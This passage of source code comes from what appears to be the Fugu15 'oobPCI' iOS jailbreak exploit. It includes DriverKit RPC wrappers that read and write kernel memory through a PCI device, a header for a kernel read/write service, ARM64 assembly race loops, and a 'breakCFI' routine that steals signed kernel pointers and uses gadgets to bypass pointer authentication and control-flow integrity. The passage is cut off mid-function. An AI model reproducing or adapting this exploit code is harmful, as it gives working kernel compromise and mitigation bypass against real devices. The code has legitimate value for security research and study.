DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryW64Message);
DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryW32Message);
DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryW16Message);
DK_MESSAGE_CONSTRUCT(DKPCIMemoryMessage, gPCIMemoryW8Message);

DK_MESSAGE_CONSTRUCT(DKPCIMemoryCopyMessage, gPCIMemoryCopyMessage);

uint64_t pcidevOffsetAdjust = 0;

void pcidev_open_session(mach_port_t dev) {
    gIOPCIDev = dev;
    
    DK_MESSAGE_CONSTRUCT_OBJS(DKPCIOpenMessage, msg, dev, dev);
    
    msg.openClose = 1;
    msg.flags     = 0;
    
    //DK_RPC(msg, DKPCIOpenMessageReply, reply);
    
    uint64_t replyBuf[100];
    
    // This RPC may fail if we already opened the device - Just ignore the error
    // (Happens when the exploit is run multiple times)
    dk_do_rpc(&msg.header, (mach_msg_header_t*) replyBuf, sizeof(replyBuf));
    
    // Setup all the messages
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryR64Message, dev, dev);
    gPCIMemoryR64Message.action = 0x80100;
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryR32Message, dev, dev);
    gPCIMemoryR32Message.action = 0x40100;
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryR16Message, dev, dev);
    gPCIMemoryR16Message.action = 0x20100;
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryR8Message,  dev, dev);
    gPCIMemoryR8Message.action  = 0x10100;
    
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryW64Message, dev, dev);
    gPCIMemoryW64Message.action = 0x80200;
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryW32Message, dev, dev);
    gPCIMemoryW32Message.action = 0x40200;
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryW16Message, dev, dev);
    gPCIMemoryW16Message.action = 0x20200;
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryMessage, gPCIMemoryW8Message,  dev, dev);
    gPCIMemoryW8Message.action  = 0x10200;
    
    DK_MESSAGE_SET_OBJECTS(DKPCIMemoryCopyMessage, gPCIMemoryCopyMessage, dev, dev);
}

uint64_t pcidev_r64(uint64_t offset) {
    gPCIMemoryR64Message.offset = offset + pcidevOffsetAdjust;
    
    DK_RPC(gPCIMemoryR64Message, DKPCIMemoryMessageReply, reply);
    
    return reply.result;
}

uint64_t pcidev_rPtr(uint64_t offset) {
    uint64_t ptr = pcidev_r64(offset);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }
    
    return ptr;
}

uint32_t pcidev_r32(uint64_t offset) {
    gPCIMemoryR32Message.offset = offset + pcidevOffsetAdjust;
    
    DK_RPC(gPCIMemoryR32Message, DKPCIMemoryMessageReply, reply);
    
    return (uint32_t) reply.result;
}

uint16_t pcidev_r16(uint64_t offset) {
    gPCIMemoryR16Message.offset = offset + pcidevOffsetAdjust;
    
    DK_RPC(gPCIMemoryR16Message, DKPCIMemoryMessageReply, reply);
    
    return (uint16_t) reply.result;
}

uint8_t pcidev_r8(uint64_t offset) {
    gPCIMemoryR8Message.offset = offset + pcidevOffsetAdjust;
    
    DK_RPC(gPCIMemoryR8Message, DKPCIMemoryMessageReply, reply);
    
    return (uint8_t) reply.result;
}

void pcidev_w64(uint64_t offset, uint64_t data) {
    gPCIMemoryW64Message.offset = offset + pcidevOffsetAdjust;
    gPCIMemoryW64Message.data   = data;
    
    DK_RPC(gPCIMemoryW64Message, DKPCIMemoryMessageReply, reply);
}

void pcidev_w32(uint64_t offset, uint32_t data) {
    gPCIMemoryW32Message.offset = offset + pcidevOffsetAdjust;
    gPCIMemoryW32Message.data   = data;
    
    DK_RPC(gPCIMemoryW32Message, DKPCIMemoryMessageReply, reply);
}

void pcidev_w16(uint64_t offset, uint16_t data) {
    gPCIMemoryW16Message.offset = offset + pcidevOffsetAdjust;
    gPCIMemoryW16Message.data   = data;
    
    DK_RPC(gPCIMemoryW16Message, DKPCIMemoryMessageReply, reply);
}

void pcidev_w8(uint64_t offset, uint8_t data) {
    gPCIMemoryW8Message.offset = offset + pcidevOffsetAdjust;
    gPCIMemoryW8Message.data   = data;
    
    DK_RPC(gPCIMemoryW8Message, DKPCIMemoryMessageReply, reply);
}

void pcidev_set_base_offset(uint64_t offset) {
    pcidevOffsetAdjust = offset;
}

mach_port_t pcidev_copy_memory(uint64_t index) {
    gPCIMemoryCopyMessage.index = index;
    
    DK_RPC(gPCIMemoryCopyMessage, DKPCIMemoryCopyMessageReply, reply);
    
    return reply.descs[0].name;
}

mach_port_t IOBufferMemoryDescriptor_create(uint64_t options, uint64_t size, uint64_t alignment) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKIOMemoryBufferInit, msg, DK_CLASS(IOBufferMemoryDescriptor));
    
    msg.options   = options;
    msg.size      = size;
    msg.alignment = alignment;
    
    DK_RPC(msg, DKIOMemoryBufferInitReply, reply);
    
    mach_port_t port = reply.descs[0].name;
    if (MACH_PORT_VALID(port)) {
        IOBufferMemoryDescriptor_setLength(port, size);
    }
    
    return port;
}

void IOBufferMemoryDescriptor_setLength(mach_port_t memoryDescriptor, uint64_t length) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKIOMemoryBufferSetLength, msg, memoryDescriptor);
    
    msg.length = length;
    
    DK_RPC(msg, DKIOMemoryBufferSetLengthReply, reply);
}

uint64_t IOMemoryDescriptor_map(mach_port_t memoryDescriptor, uint64_t offset, uint64_t len) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKIOMemoryMap, msg, memoryDescriptor);
    
    msg.options   = 0;
    msg.address   = 0;
    msg.offset    = offset;
    msg.length    = len;
    msg.alignment = 0;
    
    DK_RPC(msg, DKIOMemoryMapReply, reply);
    
    mach_port_t mapInfo = reply.descs[0].name;
    
    DK_MESSAGE_CONSTRUCT_OBJS(DKIOMemoryMapGetState, msgState, mapInfo);
    
    DK_RPC(msgState, DKIOMemoryMapGetStateReply, replyState);
    
    return replyState.address;
}

mach_port_t IODMACommand_create(void) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKIODMACommandInit, msg, DK_CLASS(IODMACommand), gDKServerPort);
    
    msg.options  = 0;
    msg.specOpts = 0;
    msg.maxAddressBits = 32;
    
    for (size_t i = 0; i < 16; i++) {
        msg.reserved[i] = 0;
    }
    
    DK_RPC(msg, DKIODMACommandInitReply, reply);
    
    return reply.descs[0].name;
}

void IODMACommand_prepare(mach_port_t command, mach_port_t memoryDescriptor) {
    DK_MESSAGE_CONSTRUCT_OBJS(DKIODMACommandPrepare, msg, command, memoryDescriptor);
    
    msg.options  = 0;
    msg.offset   = 0;
    msg.length   = 0;
    msg.segCount = 0;
    
    uint64_t replyBuf[100];
    
    // RPC will fail, but that's ok
    // DMA Command will be prepared anyway
    dk_do_rpc(&msg.header, (mach_msg_header_t*) replyBuf, sizeof(replyBuf));
}

void IODMACommand_readFrom(mach_port_t command, mach_port_t from, uint64_t length) {
    // Read from other buffer into dma command
    DK_MESSAGE_CONSTRUCT_OBJS(DKIODMACommandRW, msg, command, from);
    
    msg.options    = 0x2;
    msg.dmaOffset  = 0;
    msg.length     = length;
    msg.dataOffset = 0;
    
    DK_RPC(msg, DKIODMACommandRWReply, reply);
}

void IODMACommand_writeTo(mach_port_t command, mach_port_t to, uint64_t length) {
    // Write from dma command to other buffer
    DK_MESSAGE_CONSTRUCT_OBJS(DKIODMACommandRW, msg, command, to);
    
    msg.options    = 0x1;
    msg.dmaOffset  = 0;
    msg.length     = length;
    msg.dataOffset = 0;
    
    DK_RPC(msg, DKIODMACommandRWReply, reply);
}

```

`Exploits/oobPCI/Sources/DriverKit.h`:

```h
//
//  DriverKit.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef DriverKit_h
#define DriverKit_h

#include <mach/mach.h>

extern mach_port_t gDKIOPort;
extern mach_port_t gDKServerPort;
extern mach_port_t gDKOrigServerPort;
extern mach_port_t gIOPCIDev;

struct DriverKitRPCHeader {
    uint64_t messageID;
    uint64_t flags;
    uint64_t objCount;
};

#define DECLARE_DK_MESSAGE_COMPLEX(name, msgid, machObjs, objs, attr) \
const uint64_t DKMESSAGE$$$##name##$$$MSGID = msgid; \
const mach_msg_size_t DKMESSAGE$$$##name##$$$MACHOBJS = machObjs; \
const uint64_t DKMESSAGE$$$##name##$$$OBJS = objs; \
typedef struct { \
    mach_msg_header_t header; \
    mach_msg_body_t body; \
    mach_msg_port_descriptor_t descs[machObjs]; \
    struct DriverKitRPCHeader dkHeader; \
    uint64_t dkObjSpace[objs]; \
    struct attr; \
    uint64_t emptySpace; \
} name;

#define DECLARE_DK_MESSAGE(name, msgid, objs, attr) DECLARE_DK_MESSAGE_COMPLEX(name, msgid, objs, objs, attr)

#define DK_MESSAGE_BITS       MACH_MSG_TYPE_COPY_SEND      | (MACH_MSG_TYPE_MAKE_SEND << 8) | MACH_MSGH_BITS_COMPLEX
#define DK_MESSAGE_BITS_REPLY MACH_MSG_TYPE_MOVE_SEND_ONCE | (MACH_MSG_TYPE_MAKE_SEND << 8) | MACH_MSGH_BITS_COMPLEX

#define DK_MESSAGE_INIT_PTR(type, m) memset((m), 0, sizeof(type)); (m)->header.msgh_bits = DK_MESSAGE_BITS; (m)->header.msgh_size = sizeof(type) - 8; (m)->header.msgh_id = 0x4DA2B68C; (m)->body.msgh_descriptor_count = DKMESSAGE$$$##type##$$$MACHOBJS; (m)->dkHeader.messageID = DKMESSAGE$$$##type##$$$MSGID; (m)->dkHeader.objCount = DKMESSAGE$$$##type##$$$OBJS
#define DK_MESSAGE_INIT(type, m) DK_MESSAGE_INIT_PTR(type, &m)

#define DK_MESSAGE_CONSTRUCT(type, m) type m = { \
    .header = { \
        .msgh_bits = DK_MESSAGE_BITS, \
        .msgh_size = sizeof(type) - 8, \
        .msgh_remote_port = 0, \
        .msgh_local_port = 0, \
        .msgh_voucher_port = 0, \
        .msgh_id = 0x4DA2B68C \
    }, \
    .body = { \
        .msgh_descriptor_count = DKMESSAGE$$$##type##$$$MACHOBJS \
    }, \
    .dkHeader = { \
        .messageID = DKMESSAGE$$$##type##$$$MSGID, \
        .flags = 0, \
        .objCount = DKMESSAGE$$$##type##$$$OBJS \
    } \
}

#define DK_MESSAGE_CONSTRUCT_OBJS(type, m, ...) DK_MESSAGE_CONSTRUCT(type, m); DK_MESSAGE_SET_OBJECTS(type, m, ##__VA_ARGS__)

#define DK_MESSAGE_PTR_SET_OBJECTS(type, m, ...) dk_message_set_objects(&(m)->descs[0], DKMESSAGE$$$##type##$$$MACHOBJS, ##__VA_ARGS__)
#define DK_MESSAGE_SET_OBJECTS(type, m, ...)     DK_MESSAGE_PTR_SET_OBJECTS(type, &m, ##__VA_ARGS__)

#define DK_CLASS(name) DKCLASS$$$##name

#define DK_ASSERT_CANCAST(type, msg) dk_assert_can_cast_message(msg, sizeof(type) - 8, DKMESSAGE$$$##type##$$$MSGID, DKMESSAGE$$$##type##$$$MACHOBJS, DKMESSAGE$$$##type##$$$OBJS)
#define DK_CAST(type, msg)           (DK_ASSERT_CANCAST(type, msg); (type*) msg)
#define DK_CAST_OR_NULL(type, msg)   (dk_can_cast_message(msg, sizeof(type) - 8, DKMESSAGE$$$##type##$$$MSGID, DKMESSAGE$$$##type##$$$MACHOBJS, DKMESSAGE$$$##type##$$$OBJS) ? (type*) msg : NULL)

#define DK_RPC(m, type, replName)         type replName; dk_do_rpc(&m.header, &replName.header, sizeof(type)); DK_ASSERT_CANCAST(type, &replName)
#define DK_RECVFROM(port, type, replName) type replName; dk_rpc_recv(port, &replName.header, sizeof(type)); DK_ASSERT_CANCAST(type, &replName)

struct DKAllClassesStruct {
    const char  *name;
    mach_port_t *port;
};

void dk_init(mach_port_t ioService, mach_port_t server);
void user_server_checkin(const char *name, uint64_t tag);
mach_port_t create_dispatch_queue(const char *name);
void dispatch_queue_set_port(mach_port_t queue, mach_port_t port);
void server_register(void);
mach_port_t server_get_provider(mach_port_t queuePort);
void server_terminate(void);

void pcidev_open_session(mach_port_t dev);

uint64_t pcidev_r64(uint64_t offset);
uint64_t pcidev_rPtr(uint64_t offset);
uint32_t pcidev_r32(uint64_t offset);
uint16_t pcidev_r16(uint64_t offset);
uint8_t  pcidev_r8 (uint64_t offset);

void pcidev_w64(uint64_t offset, uint64_t data);
void pcidev_w32(uint64_t offset, uint32_t data);
void pcidev_w16(uint64_t offset, uint16_t data);
void pcidev_w8 (uint64_t offset, uint8_t data);

mach_port_t pcidev_copy_memory(uint64_t index);

void pcidev_set_base_offset(uint64_t offset);

mach_port_t IOBufferMemoryDescriptor_create(uint64_t options, uint64_t size, uint64_t alignment);
void IOBufferMemoryDescriptor_setLength(mach_port_t memoryDescriptor, uint64_t length);

uint64_t IOMemoryDescriptor_map(mach_port_t memoryDescriptor, uint64_t offset, uint64_t len);

mach_port_t IODMACommand_create(void);
void IODMACommand_prepare(mach_port_t command, mach_port_t memoryDescriptor);
void IODMACommand_readFrom(mach_port_t command, mach_port_t from, uint64_t length);
void IODMACommand_writeTo(mach_port_t command, mach_port_t to, uint64_t length);

#endif /* DriverKit_h */

```

`Exploits/oobPCI/Sources/DriverKitClasses.h`:

```h
//
//  DriverKitClasses.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef DriverKitClasses_h
#define DriverKitClasses_h

#ifndef DK_DECLARE_CLASS
#define DK_DECLARE_CLASS(name) extern mach_port_t DKCLASS$$$##name;
#endif

DK_DECLARE_CLASS(IOUserServer)
DK_DECLARE_CLASS(IODispatchQueue)
DK_DECLARE_CLASS(IOBufferMemoryDescriptor)
DK_DECLARE_CLASS(IODMACommand)

#endif

```

`Exploits/oobPCI/Sources/Fugu15KRW.h`:

```h
//
//  Fugu15KRW.h
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef Fugu15KRW_h
#define Fugu15KRW_h

#include <mach/mach.h>

// Yes, Fugu15KRW supports versioning
// No, I don't plan to actually increase the version number
#define FUGU15KRW_VERSION_0       (uint64_t) 0
#define FUGU15KRW_VERSION_CURRENT FUGU15KRW_VERSION_0

#define FUGU15KRW_ERROR_BAD_SIZE    (uint64_t) 1
#define FUGU15KRW_ERROR_BAD_VERSION (uint64_t) 2
#define FUGU15KRW_ERROR_BAD_REQ_ID  (uint64_t) 3

#define FUGU15KRW_REQ_PPL     (mach_msg_id_t) 0xF1500
#define FUGU15KRW_REQ_THSIGN  (mach_msg_id_t) 0xF1501
#define FUGU15KRW_REQ_OFFSETS (mach_msg_id_t) 0xF1502

#define FUGU15KRW_REPLY_PPL     (mach_msg_id_t) 0x52F1500
#define FUGU15KRW_REPLY_THSIGN  (mach_msg_id_t) 0x52F1501
#define FUGU15KRW_REPLY_OFFSETS (mach_msg_id_t) 0x52F1502

#define FUGU15KRW_REPLY_ERROR   (mach_msg_id_t) 0x46457272

typedef struct {
    mach_msg_header_t mach_header;
    uint64_t version;    // Our version
    uint64_t versionMin; // The minimum version the server has to support
} Fugu15KRWRequestCommon;

typedef struct {
    mach_msg_header_t mach_header;
    uint64_t version; // Server version
} Fugu15KRWReplyCommon;

typedef struct {
    Fugu15KRWRequestCommon header;
} Fugu15PPLMapRequest;

typedef struct {
    Fugu15KRWReplyCommon header;
    uint64_t mapAddr;
} Fugu15PPLMapReply;

typedef struct {
    Fugu15KRWRequestCommon header;
    uint64_t signAddr;
} Fugu15ThSignRequest;

typedef struct {
    Fugu15KRWReplyCommon header;
} Fugu15ThSignReply;

typedef struct {
    Fugu15KRWRequestCommon header;
} Fugu15OffsetsRequest;

typedef struct {
    Fugu15KRWReplyCommon header;
    uint64_t virtualBase;  // As reported in the boot args structure
    uint64_t physicalBase; // As reported in the boot args structure
    uint64_t vKernelBase;  // pKernelBase = vKernelBase - virtualBase + physicalBase
    uint64_t kernelSlide;  // vKernelBase - default kernel load address
    uint64_t kernelTTEP;   // Root translation table of the kernel, physical address
} Fugu15OffsetsReply;

typedef struct {
    Fugu15KRWReplyCommon header;
    uint64_t errorCode;
} Fugu15ErrorReply;

#endif /* Fugu15KRW_h */

```

`Exploits/oobPCI/Sources/asm.S`:

```S
//
//  asm.S
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

.text

.align 4

#define SYSCALL_PROLOGUE stp x0, x1, [sp, -16]! %% stp x2, x3, [sp, -16]! %% stp x4, x5, [sp, -16]! %% stp x6, x7, [sp, -16]!
#define SYSCALL_EPILOGUE ldp x6, x7, [sp], 16 %% ldp x4, x5, [sp], 16 %% ldp x2, x3, [sp], 16 %% ldp x0, x1, [sp], 16

#define DEF_SYSCALL(name, num)  .global _##name %% _##name: %% SYSCALL_PROLOGUE %% mov x16, num %% svc #0x80 %% mov x16, x0 %% SYSCALL_EPILOGUE %% bcc name##_end %% cmp x16, #4 %% beq _##name %% mov x16, #-1 %% name##_end: %% mov x0, x16 %% ret
#define DEF_MACHTRAP(name, num) .global _##name %% _##name: %% mov x16, -num %% svc #0x80 %% ret

.global start
start:
    b _main

.global _pac_exploit_thread
_pac_exploit_thread:
    mov x0, x20
    bl _mach_port_mod_refs
    b _pac_exploit_thread

.global _pac_exploit_doIt
_pac_exploit_doIt:
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
_pac_exploit_doIt_cont:
    str x19, [x11, x26]
    dmb sy
    ldr x24, [x11, x25]
    dmb sy
    cmp x24, x20
    bne _pac_exploit_doIt
    str x18, [x11, x27]
    dmb sy
    b _pac_exploit_doIt_cont

.global _pac_loop
_pac_loop:
    mov x0, #1
    adrp x1, _gUserReturnDidHappen@PAGE
    str x0, [x1, _gUserReturnDidHappen@PAGEOFF]
    b _pac_loop

.global _ppl_loop
_ppl_loop:
    // x0 -> Value to write
    // x1 -> Address to write to
    // x2 -> Address of done variable
    // x3 -> Address of ready variable
    mov x4, 1
    str x4, [x3]
_ppl_loop_inner:
    str x0, [x1]
    ldr x3, [x2]
    cmp x3, xzr
    beq _ppl_loop_inner
_ppl_yield_loop:
    // We are done, constantly yield until we're stopped
    mov x0, 0
    mov x1, 0
    mov x2, 0
    bl _thread_switch
    b _ppl_yield_loop

.global _ppl_done
_ppl_done:
    b _ppl_done

DEF_SYSCALL(exit,  1)
DEF_SYSCALL(write, 4)
DEF_SYSCALL(getpid, 20)
DEF_SYSCALL(getppid, 39)

DEF_MACHTRAP(vm_allocate, 10)
DEF_MACHTRAP(vm_deallocate, 12)
DEF_MACHTRAP(vm_protect, 14)
DEF_MACHTRAP(mach_port_allocate, 16)
DEF_MACHTRAP(mach_port_deallocate, 18)
DEF_MACHTRAP(mach_port_mod_refs, 19)
DEF_MACHTRAP(mach_port_insert_right, 21)
DEF_MACHTRAP(mach_reply_port, 26)
DEF_MACHTRAP(mach_thread_self, 27)
DEF_MACHTRAP(mach_task_self, 28)
DEF_MACHTRAP(mach_host_self, 29)
DEF_MACHTRAP(mach_msg_trap, 31)
DEF_MACHTRAP(mach_msg_overwrite_trap, 32)
DEF_MACHTRAP(thread_switch, 61)

.data
retvalStorage:
    .quad 0

```

`Exploits/oobPCI/Sources/badRecovery.c`:

```c
//
//  badRecovery.c
//  oobPCI
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include "badRecovery.h"

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <ptrauth.h>
#include <IOKit/IOKitLib.h>

#include "includeme.h"
#include "offsets.h"
#include "kernel.h"
#include "DriverKit.h"
#include "generated/device.h"
#include "physrw.h"
#include "kernrw_alloc.h"

exploitThreadInfo fugu15ExploitThread;
Fugu14KcallThread fugu14KcallThread;
uint64_t stack[1024];

uint64_t mapKernelPage(uint64_t addr) {
    if (fugu15ExploitThread.inited || fugu14KcallThread.inited) {
        uint64_t page       = addr & ~0x3FFFULL;
        uint64_t off        = addr & 0x3FFFULL;
        uint64_t translated = translateAddr(page);
        
        vm_address_t ptr = 0;
        kern_return_t kr = vm_allocate(mach_task_self_, &ptr, 0x4000, VM_FLAGS_ANYWHERE);
        guard (kr == KERN_SUCCESS) else {
            puts("[-] mapKernelPage: Failed to allocate page!");
            return 0;
        }
        
        pmap_enter_options_addr(gOurPmap, translated, ptr);
        
        return ptr + off;
    } else {
        return physrw_map_once(addr);
    }
}

uint64_t ensureSpecialMem(uint64_t cur) {
    uint64_t mapped = cur;
    while (mapped == 0 || translateAddr(mapped + 0x4000ULL)) {
        mapped = kmemAlloc(0x4000, NULL, false);
    }
    
    return mapped;
}

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;

uint64_t getUserReturnThreadContext(void) {
    if (gUserReturnThreadContext != 0) {
        return gUserReturnThreadContext;
    }
    
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    thread_t chThread = 0;
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, &chThread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] getUserReturnThreadContext: Failed to create return thread!");
        return 0;
    }
    
    thread_suspend(chThread);
    
    uint64_t returnThreadPtr = TASK_FIRST_THREAD(gOurTask);
    guard (returnThreadPtr != 0) else {
        puts("[-] getUserReturnThreadContext: Failed to find return thread!");
        return 0;
    }
    
    DBGPRINT_ADDRVAR(returnThreadPtr);
    
    uint64_t returnThreadACTContext = THREAD_ACT_CONTEXT(returnThreadPtr);
    guard (returnThreadACTContext != 0) else {
        puts("[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
        return 0;
    }
    
    gUserReturnThreadContext = returnThreadACTContext;
    
    return returnThreadACTContext;
}

/*
 * This function breaks Control Flow Integrity by obtaining
 * a signed thread fault handler address to an unprotected ret.
 *
 * Unprotected handlers can be found in xnu/osfmk/arm64/machine_routines_asm.s
 * See label 9 in both hw_lock_trylock_mask_allow_invalid and hw_lck_ticket_reserve_orig_allow_invalid
 *
 * (This implementation targets hw_lck_ticket_reserve_orig_allow_invalid)
 */
bool breakCFI(uint64_t kernelBase) {
    // Get this thread
    uint64_t thisThread = TASK_FIRST_THREAD(gOurTask);
    guard (thisThread != 0) else {
        puts("[-] breakCFI: Failed to find this thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(thisThread);
    
    // Create a new thread
    thread_t chThread = 0;
    bzero(&fugu15ExploitThread.gExploitThreadState, sizeof(fugu15ExploitThread.gExploitThreadState));
    
    uint64_t thStack = ((uint64_t) &stack[512]) & ~0xFULL;
    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, thStack);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_thread);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_constant((void*) 0x41424344, ptrauth_key_function_pointer, 0));
    
    fugu15ExploitThread.gExploitThreadState.__x[20] = (uint64_t) mach_host_self();
    
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT, &chThread);
    guard (kr == KERN_SUCCESS) else {
        puts("[-] breakCFI: Failed to create thread!");
        return false;
    }
    
    // Find it
    uint64_t chThreadPtr = TASK_FIRST_THREAD(gOurTask);
    if (chThreadPtr == thisThread) {
        DBGPRINT_ADDRVAR(chThreadPtr);
        chThreadPtr = THREAD_NEXT(thisThread);
        DBGPRINT_ADDRVAR(chThreadPtr);
    }
    
    guard (chThreadPtr != 0) else {
        puts("[-] breakCFI: Failed to find child thread!");
        return false;
    }
    
    DBGPRINT_ADDRVAR(chThreadPtr);
    
    // Create another thread
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_loop);
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    arm_thread_state64_t other;
    memcpy(&other, &fugu15ExploitThread.gExploitThreadState, sizeof(other));
    
    uint64_t returnThreadACTContext = getUserReturnThreadContext();
    guard (returnThreadACTContext != 0) else {
        puts("[-] breakCFI: getUserReturnThreadContext failed!");
        return false;
    }
    
    fugu15ExploitThread.gReturnContext = returnThreadACTContext;
    
    // Map exploit thread
    uint64_t mapAddr = mapKernelPage(chThreadPtr);
    guard (mapAddr != 0) else {
        puts("[-] breakCFI: Failed to map thread!");
        return false;
    }
    
    uint64_t signedFaultHandler = 0;
    while ((signedFaultHandler | 0xFFFFFF8000000000ULL) != SLIDE(gOffsets.hw_lck_ticket_reserve_orig_allow_invalid_signed)) {
        signedFaultHandler = *(volatile uint64_t*)(mapAddr + THREAD_FAULT_HNDLR_OFFSET);
    }
    
    puts("[+] breakCFI: Obtained signed fault handler!!!");
    
    DBGPRINT_ADDRVAR(signedFaultHandler);
    
    // Capture some cpu_data struct
    uint64_t cpuData = 0;
    while (cpuData == 0) {
        cpuData = *(uint64_t*)(mapAddr + THREAD_CPUDATA_OFFSET);
    }
    
    fugu15ExploitThread.gCPUData = cpuData;
    
    // Allocate a new interrupt stack for that CPU
    uint64_t intStack = kmemAlloc(0x4000 * 4, NULL, false) + 0x8000ULL; // Four pages
    fugu15ExploitThread.gIntStack = intStack;
    
    fugu15ExploitThread.gOrigIntStack = pcidev_r64(cpuData + 0x10ULL);
    
    DBGPRINT_ADDRVAR(fugu15ExploitThread.gOrigIntStack);
    
    // Replacing the interrupt stack *should* be safe, unless:
    // 1. Something is running on the old interrupt stack AND
    // 2. That code causes a synchronous exception
    // (Which never happens)
    pcidev_w64(cpuData + 0x10ULL, intStack);
    pcidev_w64(cpuData + 0x18ULL, intStack);
    
    DBGPRINT_ADDRVAR(intStack);
    
    // Suspend and abort the thread
    thread_suspend(chThread);
    thread_abort(chThread);
    
    // Our gadgets
    uint64_t brx22           = SLIDE(gOffsets.brX22); // Weird gadget, first signs x22, then jumps to it
    uint64_t signGadget      = SLIDE(gOffsets.hw_lck_ticket_reserve_orig_allow_invalid + 4ULL);
    uint64_t exceptionReturn = SLIDE(gOffsets.exceptionReturn);
    
    // Set new state
    // This state will be reflected in the kernel
    for (size_t i = 0; i < 29; i++) {
        fugu15ExploitThread.gExploitThreadState.__x[i] = 0x4142434400ULL | i;
    }
    
    uint64_t origACT = *(uint64_t*)(mapAddr + THREAD_ACT_CONTEXT_OFFSET);
    fugu15ExploitThread.gACTPtr = chThreadPtr + THREAD_ACT_CONTEXT_OFFSET;
    fugu15ExploitThread.gACTVal = origACT;
    
    fugu15ExploitThread.gExploitThreadState.__x[10] = origACT;  // ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[11] = mapAddr;
    fugu15ExploitThread.gExploitThreadState.__x[16] = chThreadPtr - THREAD_FAULT_HNDLR_OFFSET + THREAD_ACT_CONTEXT_OFFSET; // Restore ACT_CONTEXT
    fugu15ExploitThread.gExploitThreadState.__x[17] = brx22;
    
    fugu15ExploitThread.gSpecialMemRegion = ensureSpecialMem(fugu15ExploitThread.gSpecialMemRegion);
    
    fugu15ExploitThread.gExploitThreadState.__x[18] = fugu15ExploitThread.gSpecialMemRegion + 0x4000ULL - 0x140ULL;
    fugu15ExploitThread.gExploitThreadState.__x[19] = intStack + 0x3FF0ULL;
    fugu15ExploitThread.gExploitThreadState.__x[20] = cpuData;
    fugu15ExploitThread.gExploitThreadState.__x[21] = returnThreadACTContext;
    fugu15ExploitThread.gExploitThreadState.__x[22] = exceptionReturn;
    fugu15ExploitThread.gExploitThreadState.__x[23] = -1;
    fugu15ExploitThread.gExploitThreadState.__x[25] = THREAD_CPUDATA_OFFSET;
    fugu15ExploitThread.gExploitThreadState.__x[26] = THREAD_KSTACKPTR_OFFSET;
    fugu15ExploitThread.gExploitThreadState.__x[27] = THREAD_ACT_CONTEXT_OFFSET;
    
    arm_thread_state64_set_fp(fugu15ExploitThread.gExploitThreadState, 0x414243441DULL);
    arm_thread_state64_set_sp(fugu15ExploitThread.gExploitThreadState, 0x414243441EULL);
    arm_thread_state64_set_pc_fptr(fugu15ExploitThread.gExploitThreadState, (void*) pac_exploit_doIt);
    arm_thread_state64_set_lr_fptr(fugu15ExploitThread.gExploitThreadState, ptrauth_sign_unauthenticated((void*) signGadget, ptrauth_key_function_pointer, 0));
    
    // Set thread fault handler
    THREAD_FAULT_HNDLR_SET(chThreadPtr, signedFaultHandler);
    
    puts("GO!");
    
    // Set state and wait for boom!
    thread_set_state(chThread, ARM_THREAD_STATE64, (thread_state_t) &fugu15ExploitThread.gExploitThreadState, ARM_THREAD_STATE64_COUNT);
    thread_resume(chThread);
    
    uint64_t brx22Handler = 0;
    uint64_t datStack = 0;
    while ((brx22Handler | 0xFFFFFF8000000000ULL) != SLIDE(gOffsets.brX22)) {
        brx22Handler = *(volatile uint64_t*)(mapAddr + THREAD_FAULT_HNDLR_OFFSET);
        if (datStack == 0) {
            datStack = *(volatile uint64_t*)(mapAddr + THREAD_KSTACKPTR_OFFSET);
        }
    }
    
    puts("[+] breakCFI: Obtained signed br x22 fault handler!!!");
